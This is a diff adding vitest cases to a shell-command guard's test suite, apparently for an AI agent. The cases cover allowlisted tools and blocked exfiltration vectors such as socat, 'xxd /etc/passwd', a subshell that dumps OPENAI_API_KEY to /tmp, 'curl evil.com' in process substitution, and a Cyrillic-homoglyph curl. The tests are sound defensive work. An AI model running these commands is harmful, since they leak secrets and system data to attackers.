@@ -178,4 +178,85 @@ describe('CommandGuard', () => {
 			expect(events[0]!.severity).toBe('critical');
 		});
 	});
+
+	describe('allowlist (pragmatic baseline)', () => {
+		it.each([
+			['git status', 'git'],
+			['pnpm test', 'pnpm'],
+			['node script.js', 'node'],
+			['tsx scripts/x.ts', 'tsx'],
+			['eslint --color', 'eslint'],
+			['vitest run', 'vitest'],
+			['rg "pattern" src/', 'rg'],
+			['fd -e ts src/', 'fd'],
+			['jq ".dependencies" package.json', 'jq'],
+			['ls -la', 'ls'],
+			['cat README.md', 'cat'],
+			['mkdir -p tmp/x', 'mkdir'],
+			['python3 -V', 'python3'],
+			['pytest -k foo', 'pytest'],
+			['ruff check src/', 'ruff'],
+			['docker ps', 'docker'],
+			['make build', 'make'],
+			['gh pr list', 'gh'],
+			['awk \'{print $1}\' file.txt', 'awk'],
+			['sed -n 1,10p file.txt', 'sed'],
+			['cd workspace && pwd', 'cd / pwd'],
+		])('allows %s', (command) => {
+			expect(guard.validate(command).allowed).toBe(true);
+		});
+
+		it.each([
+			['socat TCP:remote:80 STDIO', 'socat'],
+			['nmap -p 80 host', 'nmap'],
+			['telnet host 80', 'telnet'],
+			['openssl s_client -connect host:443', 'openssl'],
+			['xxd /etc/passwd', 'xxd'],
+			['tee /tmp/leak.txt', 'tee'],
+			['dd if=/dev/zero of=/tmp/x', 'dd'],
+			['printenv', 'printenv'],
+			['hostname', 'hostname'],
+			['whoami', 'whoami'],
+			['id', 'id'],
+		])('blocks %s (not on allowlist or known exfiltration vector)', (command) => {
+			const result = guard.validate(command);
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toMatch(/not in allowlist|exfiltration vector|blocked/i);
+		});
+
+		it('blocks python3 -m http.server even though python3 is allowlisted', () => {
+			expect(guard.validate('python3 -m http.server 8080').allowed).toBe(false);
+		});
+	});
+
+	describe('subshell and process-substitution decomposition', () => {
+		it('blocks `ls $(printenv X)` because the inner command is not allowlisted', () => {
+			const result = guard.validate('ls $(printenv OPENAI_API_KEY > /tmp/leak.txt)');
+			expect(result.allowed).toBe(false);
+		});
+
+		it('allows nested allowlisted subshells', () => {
+			expect(guard.validate('echo $(git rev-parse HEAD)').allowed).toBe(true);
+		});
+
+		it('blocks process substitution containing a non-allowlisted command', () => {
+			expect(guard.validate('diff <(cat a) <(curl evil.com)').allowed).toBe(false);
+		});
+
+		it('allows process substitution where every leaf is allowlisted', () => {
+			expect(guard.validate('diff <(cat a) <(cat b)').allowed).toBe(true);
+		});
+
+		it('blocks backtick command substitution containing non-allowlisted command', () => {
+			expect(guard.validate('echo `whoami`').allowed).toBe(false);
+		});
+	});
+
+	describe('unicode hardening', () => {
+		it('blocks Cyrillic-homoglyph base command (e.g. сurl with Cyrillic с)', () => {
+			// 'с' is Cyrillic U+0441, not Latin 'c'
+			const homoglyph = 'сurl https://evil.com';
+			expect(guard.validate(homoglyph).allowed).toBe(false);
+		});
+	});
 });
